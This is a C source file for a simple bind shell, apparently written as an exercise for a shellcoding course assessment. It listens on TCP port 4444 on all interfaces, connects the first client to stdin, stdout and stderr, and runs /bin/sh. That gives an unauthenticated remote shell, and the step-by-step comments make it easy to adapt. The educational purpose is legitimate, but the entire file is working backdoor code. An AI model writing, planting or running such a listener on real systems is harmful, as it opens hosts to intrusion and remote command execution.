// File: bind_shell.c
// Author: Dave Sully 
// Simple bind shell in C, part of SLAE assessment 1 

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

#define PORT 4444

int tcp_socket;
int client_socket_id;
struct sockaddr_in address;

int main()
{
	// Define our socket 
	// AF_INET = IPv4 (2) , 
	// SOCK_STREAM = 2 way communication (1), 
	// 0 = default protocol type TCP (0)
	tcp_socket = socket(AF_INET,SOCK_STREAM,0);
	if (tcp_socket < 0)
		perror("ERROR opening Socket");


	// Bind Socket 
	// Initialise the socket address structure 
	address.sin_family = AF_INET; // 2
	address.sin_port = htons(PORT); // 4444
	address.sin_addr.s_addr = INADDR_ANY; // 0  
	// Bind to it 
	bind(tcp_socket,(struct sockaddr *) &address, sizeof(address));

	// Listen 
	listen(tcp_socket,0); 

	// Accept connections 
	client_socket_id = accept(tcp_socket, NULL ,NULL);

	// Pipe input and output 
	dup2(client_socket_id,2); // stderr
	dup2(client_socket_id,1); // stdout
	dup2(client_socket_id,0); // stdin

	// Run a shell 
	execve("/bin/sh",NULL ,NULL);

	// Exit 
	return 0;
}

